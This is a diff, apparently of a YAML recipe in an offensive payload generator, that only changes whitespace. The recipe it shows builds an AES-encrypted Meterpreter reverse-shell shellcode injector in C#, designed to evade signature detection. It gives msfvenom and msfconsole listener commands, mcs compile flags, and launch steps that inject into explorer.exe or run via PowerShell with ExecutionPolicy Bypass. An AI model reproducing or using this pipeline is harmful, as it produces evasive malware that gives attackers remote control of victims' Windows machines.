@@ -5,16 +5,16 @@ meta:
     Injects AES-256-CBC encrypted shellcode into a remote process using C#.
     Uses strong encryption to evade static analysis and signature detection.
     Targets Windows x64 systems.
-    
+
     The shellcode is encrypted with AES-256-CBC, and the decryption
     happens at runtime in memory. Key and IV are auto-generated.
-  
+
   effectiveness: "high"
-  
+
   mitre:
     tactic: "TA0005 - Defense Evasion"
     technique: "T1055 - Process Injection"
-  
+
   artifacts:
     - "Process creation with PROCESS_ALL_ACCESS"
     - "VirtualAllocEx and WriteProcessMemory API calls"
@@ -28,24 +28,24 @@ parameters:
     description: "Target process name (e.g., explorer.exe, notepad.exe)"
     required: true
     default: "explorer.exe"
-  
+
   - name: "lhost"
     type: "ip"
     description: "Listener IP address for reverse shell"
     required: true
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port for reverse shell"
     required: true
     default: 4444
-  
+
   - name: "output_file"
     type: "string"
     description: "Output executable filename"
     required: true
     default: "injector.exe"
-  
+
   - name: "output_path"
     type: "path"
     description: "Output directory for compiled executable"
@@ -61,7 +61,7 @@ preprocessing:
         LHOST={{ lhost }} LPORT={{ lport }} \
         EXITFUNC=thread -f raw
     output_var: "raw_shellcode"
-  
+
   # Step 2: Base64 encode the raw shellcode for processing
   - type: "script"
     name: "base64_encode_shellcode"
@@ -70,7 +70,7 @@ preprocessing:
       data: "{{ raw_shellcode }}"
       format: "string"
     output_var: "shellcode_b64"
-  
+
   # Step 3: Encrypt shellcode with AES-256-CBC (auto-generate key & IV)
   - type: "script"
     name: "aes_encryption"
@@ -80,7 +80,7 @@ preprocessing:
       key: "auto"
       iv: "auto"
     output_var: "aes_result"
-  
+
   # Step 4: Format encrypted shellcode as C# byte array
   - type: "script"
     name: "format_encrypted_payload"
@@ -90,7 +90,7 @@ preprocessing:
       var_name: "encryptedShellcode"
       bytes_per_line: 15
     output_var: "csharp_shellcode"
-  
+
   # Step 5: Format AES key as C# byte array
   - type: "script"
     name: "format_aes_key"
@@ -100,7 +100,7 @@ preprocessing:
       var_name: "aesKey"
       bytes_per_line: 16
     output_var: "csharp_key"
-  
+
   # Step 6: Format AES IV as C# byte array
   - type: "script"
     name: "format_aes_iv"
@@ -114,7 +114,7 @@ preprocessing:
 output:
   type: "template"
   template: "process_injection/aes_injector.cs"
-  
+
   compile:
     enabled: true
     compiler: "mcs"
@@ -122,13 +122,13 @@ output:
       - "-out:{{ output_path }}/{{ output_file }}"
       - "-platform:x64"
       - "-unsafe"
-  
+
   launch_instructions: |
     # Step 1: Start Metasploit listener
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; exploit"
-    
+
     # Step 2: Execute on target Windows system
     {{ output_file }} {{ target_process }}
-    
+
     # Alternative: Execute with PowerShell
     powershell -ExecutionPolicy Bypass -File {{ output_file }} {{ target_process }}
